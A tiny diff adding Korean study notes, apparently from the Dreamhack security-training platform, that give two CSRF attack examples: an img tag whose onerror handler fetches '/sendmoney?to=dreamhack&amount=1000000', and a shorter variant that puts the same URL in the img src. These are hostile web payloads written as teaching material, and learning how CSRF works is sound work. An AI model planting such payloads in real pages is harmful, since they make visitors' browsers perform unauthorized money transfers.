@@ -1,0 +1,5 @@
+(CSRF img 공격 예시)
+풀버전 : 
+<img src = 1 onerror = "fetch('/sendmoney?to=dreamhack&amount=1000000');">
+갼락 버전 : 
+<img src = "/sendmoney?to=dreamhack&amount=1000000">
